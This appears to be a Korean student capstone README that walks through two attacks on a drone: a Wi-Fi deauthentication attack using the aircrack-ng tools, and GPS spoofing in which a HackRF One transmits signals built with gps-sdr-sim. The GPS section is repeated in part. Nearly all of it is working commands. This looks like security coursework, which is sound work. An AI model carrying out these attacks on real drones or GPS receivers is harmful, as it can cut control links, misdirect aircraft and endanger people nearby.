캡스톤디자인I 코드
=================


#1. Deauth Attack
---------------

무선 랜카드가 장착된 Kali Linux 환경에서 행한다.

> 불필요한 프로세스를 종료하고, 공격에 이용할 무선랜의 이름을 확인한다.
>
> ```bash
> airmon-ng check kill
> iwconfig
> ```


> 무선랜을 모니터 모드로 전환하고, 드론 AP의 패킷을 수집한다.
>
> ```bash
> airmon-ng start [무선랜 이름]
> airodump-ng [무선랜 이름] --essid-regex [드론의 MAC주소] -w [저장 파일명]
> ```


> 수집한 패킷에서 제어 기기의 MAC주소를 확인하고, 인증해제 공격을 실행한다.
>
> ```bash
> iwconfig [무선랜 이름] channel [드론 AP의 채널]
> aireplay-ng --deauth [공격 시간] -a [드론의 MAC주소] -c [제어 기기의 MAC주소] [무선랜 이름]
> ```



2.GPS Spoofing
---------------

HackRF-One을 연결한 Linux 환경에서 행한다.

> GPS-SDR-SIM Github를 클론 설치한다.
>
> ```bash
> git clone https://github.com/osqzss/gps-sdr-sim.git
> ```


> 설치된 디렉토리로 이동해 Spoofing할 위도/경도를 지정한 gps-sdr-sim 파일을 생성한다.
>
> ```bash
> cd ./gps-sdr-sim
> gcc gpssim.c -lm -O3 -o gps-sdr-sim
> ```


> 나사에서 최신 천체 파일을 다운로드하고, 압축해제한다.
>
> ```bash
> cp /home/user/[파일명.gz] ./gps-sdr-sim
> gzip -d [파일명.gz]
> ```


> 압축해제된 천체 파일로 위도, 경도를 지정한 gpssim.bin 파일을 생성한다.
>
> ```bash
> ./gps-sdr-sim -e [파일명] -l [위도],[경도] -b 8
> ```


> HackRF_One으로 변조된 좌표의 GPS 신호를 전송한다.
>
> ```bash
> hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 40
> ```

#2. Gps Spoofing Attack
---------------
> https://github.com/osqzss/gps-sdr-sim에서 gps-sdr-sim을 clone해온다.
> ```
> git clone https://github.com/osqzss/gps-sdr-sim.git
> ```

> gps-sdr-sim 디렉토리로 이동해서 아래 명령어를 입력해준다.
> ```
> gcc gpssim.c -lm -O3 -o gps-sdr-sim
> ```
> 이렇게 하면 ELF라는 리눅스 실행파일이 생성된다.

> 나사 데이터 센터에서 가장 최근의 GPS 천체력 파일을 다운받고, 다운받은 파일의 압축을 해제한다.
> ```
> mv brdc1520.24n.gz /gps-sdr-sim
> cp /home/seulki/brdc1520.24n.gz ./brdc1520.24n.gz
> ```



[hackrf](https://github.com/greatscottgadgets/hackrf.git)
[gps-sdr-sim](https://github.com/osqzss/gps-sdr-sim)
